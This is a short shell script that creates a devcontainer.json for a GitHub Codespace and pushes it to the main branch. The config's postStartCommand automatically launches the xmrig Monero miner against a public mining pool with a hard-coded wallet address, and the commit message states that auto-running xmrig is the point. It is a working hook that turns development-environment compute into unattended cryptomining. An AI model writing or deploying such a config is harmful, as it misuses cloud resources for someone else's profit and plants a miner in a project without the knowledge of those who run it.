mkdir -p .devcontainer

cat <<EOL > .devcontainer/devcontainer.json
{
    "name": "My Codespace",
    "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
    "features": {
        "ghcr.io/devcontainers/features/sshd:1": {
            "version": "latest"
        }
    },
    "postStartCommand": "cd xmrig/build && ./xmrig -o pool.supportxmr.com:3333 -u 43khU9ihaygYzmA2XHhF6Tb4AD2swPrt54iBZvS3iPwWX3DF52SZHhidgBFo4gp2rbTRmqLU6MQxjj1ojJK38tESCVQThg6 -p worke2 -k --coin monero",
    "customizations": {
        "vscode": {
            "settings": {
                "python.pythonPath": "/usr/local/bin/python"
            },
            "extensions": [
                "ms-python.python"
            ]
        }
    }
}
EOL

git add .devcontainer/devcontainer.json
git commit -m "Add devcontainer with postStartCommand to auto-run xmrig"
git push origin main
